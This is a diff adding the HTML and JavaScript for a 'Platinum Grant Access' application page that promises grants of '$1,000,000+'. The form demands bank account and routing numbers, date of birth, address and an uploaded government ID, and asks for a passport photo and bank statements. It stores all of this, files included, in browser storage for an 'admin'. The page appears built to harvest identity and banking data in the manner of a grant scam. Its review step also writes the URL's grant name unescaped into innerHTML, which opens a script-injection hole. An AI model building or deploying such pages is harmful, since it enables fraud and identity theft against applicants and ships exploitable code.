@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+<title>Apply | Platinum Grant Access</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{--navy:#0a1f44;--navy2:#0d2857;--gold:#c9a84c;--off:#f8f9fc;--text:#1a1a2e;--muted:#6b7280;--border:#e5e7eb;--green:#16a34a;--red:#dc2626;}
+html{overflow-x:hidden;}
+body{font-family:'Inter',sans-serif;color:var(--text);background:var(--off);font-size:16px;overflow-x:hidden;}
+nav{position:sticky;top:0;z-index:100;background:#fff;border-bottom:1px solid var(--border);height:60px;display:flex;align-items:center;padding:0 16px;justify-content:space-between;}
+.nav-logo-box{width:32px;height:32px;background:linear-gradient(135deg,var(--navy),var(--navy2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;color:var(--gold);}
+.grant-banner{background:linear-gradient(135deg,var(--navy),var(--navy2));padding:20px 16px;}
+.gb-name{font-size:15px;font-weight:800;color:#fff;margin-bottom:4px;}
+.gb-amt{font-size:26px;font-weight:900;color:var(--gold);}
+
+/* PROGRESS */
+.prog-bar{background:#fff;border-bottom:1px solid var(--border);padding:16px;}
+.prog-steps{display:flex;align-items:center;gap:0;position:relative;}
+.prog-step{display:flex;flex-direction:column;align-items:center;flex:1;}
+.prog-connector{flex:1;height:2px;background:var(--border);margin-bottom:24px;transition:background .3s;}
+.prog-connector.done{background:var(--navy);}
+.prog-circle{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;transition:all .3s;}
+.prog-step.done .prog-circle{background:var(--navy);color:#fff;}
+.prog-step.active .prog-circle{background:var(--gold);color:var(--navy);}
+.prog-step.pending .prog-circle{background:var(--border);color:var(--muted);}
+.prog-label{font-size:11px;font-weight:600;margin-top:6px;color:var(--muted);text-align:center;}
+.prog-step.active .prog-label,.prog-step.done .prog-label{color:var(--navy);font-weight:700;}
+
+/* FORM */
+main{padding:16px 16px 80px;max-width:560px;margin:0 auto;}
+.form-card{background:#fff;border-radius:14px;padding:20px;border:1px solid var(--border);margin-bottom:16px;}
+.form-card h2{font-size:18px;font-weight:900;color:var(--navy);margin-bottom:4px;}
+.card-sub{font-size:13px;color:var(--muted);margin-bottom:20px;padding-bottom:14px;border-bottom:1px solid var(--border);}
+.fg{display:flex;flex-direction:column;gap:6px;margin-bottom:16px;}
+.fg label{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:var(--muted);}
+.fg label span.req{color:var(--red);}
+.fg input,.fg select,.fg textarea{padding:12px 14px;border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:border .2s;color:var(--text);background:#fff;width:100%;-webkit-appearance:none;}
+.fg input:focus,.fg select:focus,.fg textarea:focus{border-color:var(--navy);}
+.fg input.err,.fg select.err,.fg textarea.err{border-color:var(--red);}
+.fg textarea{min-height:100px;resize:vertical;}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.sec-div{display:flex;align-items:center;gap:10px;margin:20px 0 14px;padding-bottom:10px;border-bottom:2px solid var(--off);}
+.sec-div h3{font-size:15px;font-weight:800;color:var(--navy);}
+
+/* FILE UPLOAD — fixed, working */
+.file-upload-wrap{position:relative;border:2px dashed var(--border);border-radius:10px;padding:20px 16px;text-align:center;background:#fafafa;transition:all .25s;cursor:pointer;}
+.file-upload-wrap:hover,.file-upload-wrap.has-file{border-color:var(--navy);background:#f0f4ff;}
+.file-upload-wrap.has-file{border-color:var(--green);background:#f0fdf4;}
+.file-upload-wrap input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;z-index:2;}
+.fu-icon{font-size:28px;margin-bottom:8px;}
+.fu-title{font-size:14px;font-weight:700;color:var(--navy);}
+.fu-sub{font-size:12px;color:var(--muted);margin-top:3px;}
+.fu-preview{font-size:12px;font-weight:700;color:var(--green);margin-top:8px;word-break:break-all;}
+.fu-error{font-size:12px;font-weight:600;color:var(--red);margin-top:6px;}
+
+/* REVIEW */
+.review-box{background:var(--off);border-radius:10px;padding:16px;margin-top:16px;}
+.review-box h3{font-size:14px;font-weight:800;color:var(--navy);margin-bottom:12px;}
+.rv{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);gap:8px;}
+.rv:last-child{border-bottom:none;}
+.rv-label{font-size:12px;color:var(--muted);font-weight:600;flex-shrink:0;}
+.rv-val{font-size:13px;color:var(--text);font-weight:600;text-align:right;}
+
+/* BUTTONS */
+.btn-next{width:100%;padding:15px;background:linear-gradient(135deg,var(--navy),var(--navy2));color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:800;cursor:pointer;font-family:'Inter',sans-serif;transition:all .25s;margin-top:8px;}
+.btn-submit{width:100%;padding:16px;background:linear-gradient(135deg,var(--gold),#e8c96a);color:var(--navy);border:none;border-radius:10px;font-size:17px;font-weight:900;cursor:pointer;font-family:'Inter',sans-serif;transition:all .25s;margin-top:8px;}
+.btn-back{width:100%;padding:13px;background:transparent;color:var(--muted);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;margin-bottom:10px;}
+.err-msg{background:#fee2e2;border:1px solid #fecaca;border-radius:8px;padding:10px 14px;font-size:13px;font-weight:600;color:var(--red);margin-bottom:12px;display:none;}
+
+.page-sec{display:none;}
+.page-sec.active{display:block;}
+footer{background:var(--navy);padding:20px 16px;text-align:center;}
+footer p{color:rgba(255,255,255,0.4);font-size:12px;}
+</style>
+</head>
+<body>
+<nav>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div class="nav-logo-box">PG</div>
+    <span style="font-size:14px;font-weight:800;color:var(--navy);">Grant Application</span>
+  </div>
+  <a href="grants.html" style="font-size:13px;color:var(--navy);font-weight:700;text-decoration:none;">← Grants</a>
+</nav>
+
+<div class="grant-banner">
+  <div class="gb-name" id="bannerName">Loading grant...</div>
+  <div class="gb-amt" id="bannerAmt">$0</div>
+</div>
+
+<div class="prog-bar">
+  <div style="display:flex;align-items:center;">
+    <div class="prog-step active" id="ps1">
+      <div class="prog-circle">1</div>
+      <div class="prog-label">Personal & Business</div>
+    </div>
+    <div class="prog-connector" id="pc1"></div>
+    <div class="prog-step pending" id="ps2">
+      <div class="prog-circle">2</div>
+      <div class="prog-label">Financial & Submit</div>
+    </div>
+  </div>
+</div>
+
+<main>
+<div id="errBanner" class="err-msg"></div>
+
+<!-- PAGE 1 -->
+<div class="page-sec active" id="page1">
+<div class="form-card">
+  <h2>👤 Personal Information</h2>
+  <p class="card-sub">Enter details exactly as on your government-issued ID.</p>
+
+  <div class="row2">
+    <div class="fg"><label>First Name <span class="req">*</span></label><input type="text" id="p1_fn" placeholder="First name"/></div>
+    <div class="fg"><label>Last Name <span class="req">*</span></label><input type="text" id="p1_ln" placeholder="Last name"/></div>
+  </div>
+  <div class="row2">
+    <div class="fg"><label>Date of Birth <span class="req">*</span></label><input type="date" id="p1_dob"/></div>
+    <div class="fg"><label>Gender</label><select id="p1_gender"><option value="">Select...</option><option>Male</option><option>Female</option><option>Non-Binary</option><option>Prefer not to say</option></select></div>
+  </div>
+  <div class="fg"><label>Phone Number <span class="req">*</span></label><input type="tel" id="p1_phone" placeholder="(555) 000-0000"/></div>
+  <div class="fg"><label>Email Address <span class="req">*</span></label><input type="email" id="p1_email" placeholder="you@email.com"/></div>
+  <div class="fg"><label>Street Address <span class="req">*</span></label><input type="text" id="p1_addr" placeholder="123 Main Street"/></div>
+  <div class="row2">
+    <div class="fg"><label>City <span class="req">*</span></label><input type="text" id="p1_city" placeholder="City"/></div>
+    <div class="fg"><label>State <span class="req">*</span></label><select id="p1_state"><option value="">State...</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select></div>
+  </div>
+  <div class="fg"><label>ZIP Code <span class="req">*</span></label><input type="text" id="p1_zip" placeholder="00000" maxlength="10"/></div>
+
+  <div class="sec-div"><span>🏢</span><h3>Business Info (if applicable)</h3></div>
+  <div class="fg"><label>Is this a business grant?</label><select id="p1_isbiz" onchange="toggleBiz()"><option value="no">No — Personal Grant</option><option value="yes">Yes — Business Grant</option></select></div>
+
+  <div id="bizSection" style="display:none;">
+    <div class="fg"><label>Business Name</label><input type="text" id="p1_bizname" placeholder="Your Business Name"/></div>
+    <div class="row2">
+      <div class="fg"><label>Industry</label><select id="p1_biztype"><option value="">Select...</option><option>Technology</option><option>Fashion</option><option>Crypto / Blockchain</option><option>Agriculture</option><option>Healthcare</option><option>Education</option><option>Food & Beverage</option><option>Real Estate</option><option>Manufacturing</option><option>Retail</option><option>Construction</option><option>Media</option><option>Non-Profit</option><option>Other</option></select></div>
+      <div class="fg"><label>Registration</label><select id="p1_bizreg"><option value="">Select...</option><option>LLC</option><option>C-Corp</option><option>S-Corp</option><option>Sole Proprietor</option><option>Partnership</option><option>Non-Profit 501c3</option><option>Not Registered</option></select></div>
+    </div>
+    <div class="fg"><label>Business Description</label><textarea id="p1_bizdesc" placeholder="What does your business do?"></textarea></div>
+    <div class="fg"><label>Target Market</label><textarea id="p1_targetmkt" placeholder="Who are your customers?" style="min-height:80px;"></textarea></div>
+    <div class="fg"><label>Revenue Strategy</label><textarea id="p1_revenue" placeholder="How do you generate revenue?" style="min-height:80px;"></textarea></div>
+    <div class="fg"><label>Budget Breakdown</label><textarea id="p1_budget" placeholder="How will grant funds be used? (e.g. Equipment $50K, Staff $30K...)" style="min-height:90px;"></textarea></div>
+  </div>
+
+  <button class="btn-next" onclick="goPage2()">Continue →</button>
+</div>
+</div>
+
+<!-- PAGE 2 -->
+<div class="page-sec" id="page2">
+<div class="form-card">
+  <h2>💳 Financial Information</h2>
+  <p class="card-sub">Needed to process your application and disburse funds.</p>
+
+  <div class="row2">
+    <div class="fg"><label>Bank Name <span class="req">*</span></label><input type="text" id="p2_bank" placeholder="e.g. Chase"/></div>
+    <div class="fg"><label>Account Type <span class="req">*</span></label><select id="p2_accttype"><option value="">Select...</option><option>Checking</option><option>Savings</option><option>Business Checking</option><option>Business Savings</option></select></div>
+  </div>
+  <div class="row2">
+    <div class="fg"><label>Account Number <span class="req">*</span></label><input type="text" id="p2_acct" placeholder="Account number"/></div>
+    <div class="fg"><label>Routing Number <span class="req">*</span></label><input type="text" id="p2_routing" placeholder="Routing number"/></div>
+  </div>
+  <div class="row2">
+    <div class="fg"><label>Annual Income</label><input type="text" id="p2_income" placeholder="e.g. $45,000"/></div>
+    <div class="fg"><label>Monthly Expenses</label><input type="text" id="p2_expenses" placeholder="e.g. $3,500"/></div>
+  </div>
+  <div class="fg"><label>Existing Funding</label><input type="text" id="p2_existing" placeholder="None / or describe existing funding"/></div>
+
+  <div class="sec-div"><span>📎</span><h3>Supporting Documents</h3></div>
+  <p style="font-size:13px;color:var(--muted);margin-bottom:16px;">Upload clear photos or scans. Accepted: JPG, PNG, PDF (max 15MB each)</p>
+
+  <div class="fg">
+    <label>Valid ID — Passport, Driver's License or National ID <span class="req">*</span></label>
+    <div class="file-upload-wrap" id="wrap_id" onclick="triggerFile('file_id')">
+      <input type="file" id="file_id" accept="image/jpeg,image/png,image/jpg,image/heic,application/pdf" onchange="handleFile(this,'wrap_id','prev_id')"/>
+      <div class="fu-icon">🪪</div>
+      <div class="fu-title">Tap to upload your ID</div>
+      <div class="fu-sub">JPG, PNG or PDF · Max 15MB</div>
+      <div class="fu-preview" id="prev_id"></div>
+    </div>
+  </div>
+
+  <div class="fg">
+    <label>Passport Photo</label>
+    <div class="file-upload-wrap" id="wrap_photo" onclick="triggerFile('file_photo')">
+      <input type="file" id="file_photo" accept="image/jpeg,image/png,image/jpg,image/heic" onchange="handleFile(this,'wrap_photo','prev_photo')"/>
+      <div class="fu-icon">📷</div>
+      <div class="fu-title">Tap to upload passport photo</div>
+      <div class="fu-sub">JPG or PNG · Max 15MB</div>
+      <div class="fu-preview" id="prev_photo"></div>
+    </div>
+  </div>
+
+  <div class="fg">
+    <label>Bank Statements (Last 3 Months)</label>
+    <div class="file-upload-wrap" id="wrap_bank" onclick="triggerFile('file_bank')">
+      <input type="file" id="file_bank" accept="image/jpeg,image/png,image/jpg,application/pdf" multiple onchange="handleFile(this,'wrap_bank','prev_bank')"/>
+      <div class="fu-icon">🏦</div>
+      <div class="fu-title">Tap to upload statements</div>
+      <div class="fu-sub">PDF or images · Multiple allowed</div>
+      <div class="fu-preview" id="prev_bank"></div>
+    </div>
+  </div>
+
+  <div class="fg">
+    <label>Business Registration (if applicable)</label>
+    <div class="file-upload-wrap" id="wrap_biz" onclick="triggerFile('file_biz')">
+      <input type="file" id="file_biz" accept="image/jpeg,image/png,image/jpg,application/pdf" onchange="handleFile(this,'wrap_biz','prev_biz')"/>
+      <div class="fu-icon">📋</div>
+      <div class="fu-title">Tap to upload registration</div>
+      <div class="fu-sub">PDF or image · Max 15MB</div>
+      <div class="fu-preview" id="prev_biz"></div>
+    </div>
+  </div>
+
+  <div class="fg">
+    <label>Proposal / Pitch Document</label>
+    <div class="file-upload-wrap" id="wrap_proposal" onclick="triggerFile('file_proposal')">
+      <input type="file" id="file_proposal" accept="image/jpeg,image/png,application/pdf,.doc,.docx" onchange="handleFile(this,'wrap_proposal','prev_proposal')"/>
+      <div class="fu-icon">📄</div>
+      <div class="fu-title">Tap to upload proposal</div>
+      <div class="fu-sub">PDF, DOC, DOCX · Max 20MB</div>
+      <div class="fu-preview" id="prev_proposal"></div>
+    </div>
+  </div>
+
+  <div class="sec-div"><span>✍️</span><h3>Personal Statement</h3></div>
+  <div class="fg"><label>Why do you deserve this grant? <span class="req">*</span></label><textarea id="p2_why" placeholder="Tell your story. Why are you applying and what makes you unique?"></textarea></div>
+  <div class="fg"><label>How will you use the money responsibly? <span class="req">*</span></label><textarea id="p2_how" placeholder="Describe specifically how grant funds will be used and what impact they will have."></textarea></div>
+
+  <div class="sec-div"><span>📝</span><h3>Review & Submit</h3></div>
+  <div class="review-box" id="reviewBox"></div>
+
+  <div style="margin-top:16px;padding:14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;">
+    <p style="font-size:13px;color:#166534;line-height:1.7;">✅ By submitting, you certify all information is accurate and truthful. Fraudulent applications are reported to federal authorities under 18 U.S.C. § 1001.</p>
+  </div>
+
+  <div style="margin-top:16px;">
+    <button class="btn-back" onclick="goPage1()">← Back</button>
+    <button class="btn-submit" onclick="submitApp()">Submit Application 🚀</button>
+  </div>
+</div>
+</div>
+</main>
+
+<footer><p>© 2026 Platinum Grant Access · 🔒 256-bit encrypted</p></footer>
+
+<script>
+// Get grant info from URL
+const params = new URLSearchParams(window.location.search);
+const grantId = params.get('gid') || '1';
+const grantName = params.get('gname') ? decodeURIComponent(params.get('gname')) : 'Selected Grant';
+const grantAmt = params.get('gamt') ? decodeURIComponent(params.get('gamt')) : '$1,000,000+';
+
+document.getElementById('bannerName').textContent = grantName;
+document.getElementById('bannerAmt').textContent = grantAmt;
+
+// Pre-fill from registration
+const user = JSON.parse(localStorage.getItem('pgaUser') || '{}');
+if(user.firstName) document.getElementById('p1_fn').value = user.firstName;
+if(user.lastName) document.getElementById('p1_ln').value = user.lastName;
+if(user.email) document.getElementById('p1_email').value = user.email;
+if(user.phone) document.getElementById('p1_phone').value = user.phone;
+
+function toggleBiz(){
+  const show = document.getElementById('p1_isbiz').value === 'yes';
+  document.getElementById('bizSection').style.display = show ? 'block' : 'none';
+}
+
+// FILE HANDLING — robust, no errors
+function triggerFile(id){
+  // Don't retrigger if clicking on the input itself
+  const input = document.getElementById(id);
+  if(input) input.click();
+}
+
+function handleFile(input, wrapId, prevId){
+  const wrap = document.getElementById(wrapId);
+  const prev = document.getElementById(prevId);
+  const MAX = 20 * 1024 * 1024; // 20MB
+
+  if(!input.files || input.files.length === 0){
+    wrap.classList.remove('has-file');
+    prev.textContent = '';
+    return;
+  }
+
+  let allOk = true;
+  let names = [];
+  Array.from(input.files).forEach(file => {
+    if(file.size > MAX){
+      allOk = false;
+      prev.innerHTML = `<span class="fu-error">❌ "${file.name}" is too large (max 20MB)</span>`;
+    } else {
+      names.push(file.name);
+    }
+  });
+
+  if(allOk && names.length){
+    wrap.classList.add('has-file');
+    prev.innerHTML = names.map(n=>`✅ ${n}`).join('<br/>');
+  }
+}
+
+// Fix: stop click propagation from input to wrapper
+document.querySelectorAll('.file-upload-wrap input[type="file"]').forEach(input => {
+  input.addEventListener('click', e => e.stopPropagation());
+});
+
+function showErr(msg){
+  const el = document.getElementById('errBanner');
+  el.textContent = msg;
+  el.style.display = 'block';
+  el.scrollIntoView({behavior:'smooth',block:'start'});
+}
+function hideErr(){ document.getElementById('errBanner').style.display='none'; }
+
+function markErr(id){
+  const el = document.getElementById(id);
+  if(el){ el.classList.add('err'); el.addEventListener('input',()=>el.classList.remove('err'),{once:true}); }
+}
+
+function goPage2(){
+  hideErr();
+  const required = [
+    {id:'p1_fn',label:'First Name'},
+    {id:'p1_ln',label:'Last Name'},
+    {id:'p1_dob',label:'Date of Birth'},
+    {id:'p1_phone',label:'Phone Number'},
+    {id:'p1_email',label:'Email Address'},
+    {id:'p1_addr',label:'Street Address'},
+    {id:'p1_city',label:'City'},
+    {id:'p1_state',label:'State'},
+    {id:'p1_zip',label:'ZIP Code'},
+  ];
+  let missing = [];
+  required.forEach(r=>{
+    const el = document.getElementById(r.id);
+    if(!el || !el.value.trim()){ markErr(r.id); missing.push(r.label); }
+  });
+  if(missing.length){ showErr('Please fill in: ' + missing.join(', ')); return; }
+
+  buildReview();
+  document.getElementById('page1').classList.remove('active');
+  document.getElementById('page2').classList.add('active');
+  document.getElementById('ps1').className = 'prog-step done';
+  document.getElementById('pc1').classList.add('done');
+  document.getElementById('ps2').className = 'prog-step active';
+  window.scrollTo(0,0);
+}
+
+function goPage1(){
+  document.getElementById('page2').classList.remove('active');
+  document.getElementById('page1').classList.add('active');
+  document.getElementById('ps1').className = 'prog-step active';
+  document.getElementById('pc1').classList.remove('done');
+  document.getElementById('ps2').className = 'prog-step pending';
+  window.scrollTo(0,0);
+}
+
+function buildReview(){
+  const isBiz = document.getElementById('p1_isbiz').value === 'yes';
+  const html = `
+    <h3>📋 Application Summary</h3>
+    <div class="rv"><span class="rv-label">Grant</span><span class="rv-val">${grantName}</span></div>
+    <div class="rv"><span class="rv-label">Amount</span><span class="rv-val" style="color:var(--navy);font-weight:900;">${grantAmt}</span></div>
+    <div class="rv"><span class="rv-label">Name</span><span class="rv-val">${document.getElementById('p1_fn').value} ${document.getElementById('p1_ln').value}</span></div>
+    <div class="rv"><span class="rv-label">Date of Birth</span><span class="rv-val">${document.getElementById('p1_dob').value}</span></div>
+    <div class="rv"><span class="rv-label">Email</span><span class="rv-val">${document.getElementById('p1_email').value}</span></div>
+    <div class="rv"><span class="rv-label">Phone</span><span class="rv-val">${document.getElementById('p1_phone').value}</span></div>
+    <div class="rv"><span class="rv-label">Location</span><span class="rv-val">${document.getElementById('p1_city').value}, ${document.getElementById('p1_state').value}</span></div>
+    ${isBiz ? `<div class="rv"><span class="rv-label">Business</span><span class="rv-val">${document.getElementById('p1_bizname').value||'—'}</span></div>` : ''}
+  `;
+  document.getElementById('reviewBox').innerHTML = html;
+}
+
+function getFileNames(inputId){
+  const input = document.getElementById(inputId);
+  if(!input || !input.files || !input.files.length) return [];
+  return Array.from(input.files).map(f=>f.name);
+}
+
+function readFileAsBase64(file){
+  return new Promise((resolve,reject)=>{
+    const reader = new FileReader();
+    reader.onload = e => resolve({name:file.name, type:file.type, data:e.target.result});
+    reader.onerror = () => resolve({name:file.name, type:file.type, data:null});
+    reader.readAsDataURL(file);
+  });
+}
+
+async function submitApp(){
+  hideErr();
+
+  // Validate page 2 required
+  const req2 = [
+    {id:'p2_bank',label:'Bank Name'},
+    {id:'p2_accttype',label:'Account Type'},
+    {id:'p2_acct',label:'Account Number'},
+    {id:'p2_routing',label:'Routing Number'},
+    {id:'p2_why',label:'Personal Statement (Why you deserve this grant)'},
+    {id:'p2_how',label:'How you will use the money'},
+  ];
+  let missing = [];
+  req2.forEach(r=>{
+    const el = document.getElementById(r.id);
+    if(!el || !el.value.trim()){ markErr(r.id); missing.push(r.label); }
+  });
+  if(missing.length){ showErr('Please complete: ' + missing.join(', ')); return; }
+
+  // Check ID upload
+  const idFile = document.getElementById('file_id');
+  if(!idFile || !idFile.files || !idFile.files.length){
+    showErr('Please upload your Valid ID document (required to submit).');
+    document.getElementById('wrap_id').style.borderColor = 'var(--red)';
+    document.getElementById('wrap_id').scrollIntoView({behavior:'smooth'});
+    return;
+  }
+
+  // Show loading
+  const submitBtn = document.querySelector('.btn-submit');
+  submitBtn.textContent = 'Submitting... ⏳';
+  submitBtn.disabled = true;
+
+  // Read files as base64 for admin panel viewing
+  let filesData = {};
+  const fileInputs = ['file_id','file_photo','file_bank','file_biz','file_proposal'];
+  for(const fid of fileInputs){
+    const inp = document.getElementById(fid);
+    if(inp && inp.files && inp.files.length){
+      filesData[fid] = [];
+      for(const file of inp.files){
+        const fdata = await readFileAsBase64(file);
+        filesData[fid].push(fdata);
+      }
+    }
+  }
+
+  // Build application object
+  const appId = 'APP-' + Date.now();
+  const appData = {
+    id: appId,
+    status: 'Pending Review',
+    submittedAt: new Date().toISOString(),
+    grantId, grantName, grantAmount: grantAmt,
+    personal: {
+      firstName: document.getElementById('p1_fn').value,
+      lastName: document.getElementById('p1_ln').value,
+      dob: document.getElementById('p1_dob').value,
+      gender: document.getElementById('p1_gender').value,
+      phone: document.getElementById('p1_phone').value,
+      email: document.getElementById('p1_email').value,
+      address: document.getElementById('p1_addr').value,
+      city: document.getElementById('p1_city').value,
+      state: document.getElementById('p1_state').value,
+      zip: document.getElementById('p1_zip').value,
+    },
+    business: document.getElementById('p1_isbiz').value === 'yes' ? {
+      isBusiness: true,
+      name: document.getElementById('p1_bizname').value,
+      type: document.getElementById('p1_biztype').value,
+      registration: document.getElementById('p1_bizreg').value,
+      description: document.getElementById('p1_bizdesc').value,
+      targetMarket: document.getElementById('p1_targetmkt').value,
+      revenue: document.getElementById('p1_revenue').value,
+      budget: document.getElementById('p1_budget').value,
+    } : {isBusiness: false},
+    financial: {
+      bank: document.getElementById('p2_bank').value,
+      accountType: document.getElementById('p2_accttype').value,
+      accountNumber: document.getElementById('p2_acct').value,
+      routingNumber: document.getElementById('p2_routing').value,
+      income: document.getElementById('p2_income').value,
+      expenses: document.getElementById('p2_expenses').value,
+      existingFunding: document.getElementById('p2_existing').value,
+    },
+    statement: {
+      whyDeserve: document.getElementById('p2_why').value,
+      howUse: document.getElementById('p2_how').value,
+    },
+    documents: {
+      fileNames: {
+        id: getFileNames('file_id'),
+        photo: getFileNames('file_photo'),
+        bankStatements: getFileNames('file_bank'),
+        businessReg: getFileNames('file_biz'),
+        proposal: getFileNames('file_proposal'),
+      },
+      filesData: filesData
+    }
+  };
+
+  // Save to localStorage (shared with admin)
+  const existing = JSON.parse(localStorage.getItem('pgaApplications') || '[]');
+  existing.push(appData);
+  localStorage.setItem('pgaApplications', JSON.stringify(existing));
+  localStorage.setItem('pgaLastApp', JSON.stringify(appData));
+
+  // Redirect to confirmation
+  window.location.href = 'confirmation.html';
+}
+</script>
+</body>
+</html>
